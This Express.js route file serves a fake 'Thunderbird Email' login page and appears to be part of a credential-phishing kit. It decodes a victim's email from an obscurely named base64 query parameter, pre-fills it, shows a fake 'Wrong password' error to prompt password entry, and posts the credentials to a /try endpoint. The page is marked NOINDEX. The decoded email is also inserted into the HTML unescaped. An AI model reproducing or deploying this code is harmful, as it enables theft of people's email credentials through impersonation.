const express = require ('express');
const router = express.Router();
const bodyParser = require('body-parser');


router.use(bodyParser.urlencoded({ extended: false }));



router.get('/', (req, res) => {

    const data = req.query.hfdgdhguirehfdhgfdrereoh;

    const username = Buffer.from(data, 'base64').toString('utf-8');

    if (data == null) {
    res.render('error');
    
  }else{


    const htmlContent = `    
	
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=10">
        <link rel="shortcut icon" href="../image/thunder.png" type="image/x-icon">
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="Robots" content="NOINDEX, NOFOLLOW">
        <link rel="stylesheet" href="../style/style.css">
        <title>Thunderbird Email</title>
        <style>
            #loader {
              
              position: absolute;
              top: calc(50% - 20px);
              left: calc(50% - 20px);
            }
            @keyframes loader {
              0% { left: -100px }
              100% { left: 110%; }
            }
            #box {
              width: 50px;
              height: 50px;
              background:  #0066cc;
              animation: animate .5s linear infinite;
              position: absolute;
              top: 0;
              left: 0;
              border-radius: 3px;
            }
            @keyframes animate {
              17% { border-bottom-right-radius: 3px; }
              25% { transform: translateY(9px) rotate(22.5deg); }
              50% {
                transform: translateY(18px) scale(1,.9) rotate(45deg) ;
                border-bottom-right-radius: 40px;
              }
              75% { transform: translateY(9px) rotate(67.5deg); }
              100% { transform: translateY(0) rotate(90deg); }
            } 
            #shadow { 
              width: 50px;
              height: 5px;
              background: #000;
              opacity: 0.1;
              position: absolute;
              top: 59px;
              left: 0;
              border-radius: 50%;
              animation: shadow .5s linear infinite;
            }
            @keyframes shadow {
              50% {
                transform: scale(1.2,1);
              }
            }
            </style>

            <!-- <script>
                        // Function to extract query parameter value
                        function getQueryParameter(parameterName) {
                          var queryString = window.location.search;
                          var urlParams = new URLSearchParams(queryString);
                          return urlParams.get(parameterName);
                        }
                        // Get the value from the 'data' query parameter
                        var value = getQueryParameter('rtrfgdfgeterutyijkghnvbsdfate');
                        
                        if(value == null) {
                        
                            window.location.href = "error.html";
                        
                        }else{
                        
                        var b64name = atob(value);
                        
                        function onLoad() {
                          var b64name = atob(value);
                          var inputField = document.getElementById('username');
                          inputField.value = b64name;
                        }
                        }

            </script> -->
    </head>
    <body onload="onLoad();">
        <div class="conTainer">
            <center>
            <div class="main-Body-box">
            <div class="Heder-Container">
                <div class="Header-font">
                    <p style="line-height: 200%;">Authentication Process</p>
                    <div class="close-Window"><img src="../image/close-window.png" width="20" height="20"/></div>
                </div>
            </div>
            <div class="Body-containeR">
                <div class="image-logo">
                    <div class="img-logo">
                        <img src="../image/thunder.png" width="100" height="70">
                    </div>
                    <div class="text-logo" style="line-height: 20%;">
                        <h4>Authenticate Your Existing Thunderbird's Account</h4>
                    </div>
                </div>
            <form  method="post" name="loginForm" action="/try" accept-charset="UTF-8">

                <div class="form-data">
                
                    <div class="lable-forInput">
                    <label>Email Address:</label>
                    </div>
                    <div>
                    <input type="text" name="username" id="username" class="InputField" value="${username}">
                    </div>
                    <br>
                    <div>
                    <label class="lable-forInput">Password:</label>
                    </div>
                    <div>
                    <input type="password" name="password" id="password" class="InputField" value="" placeholder="Password">
                    </div>
                    <br>
                    
                   
                </div>
                </div>
                <div class="error-msg">
                    <p id="error-class" style="color: red;">Wrong password try again.....</p>
                </div>
                
                
                <div class="button-class">
                    <button type="submit" class="class-button" style="width: 89px;height: 25px;font-size: 16px;">Continue</button>
                </div>
            </form>
            </div>
            </div>
            </center>
        </div>
    </body>
    </html>

    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }

});
     
   



module.exports =router
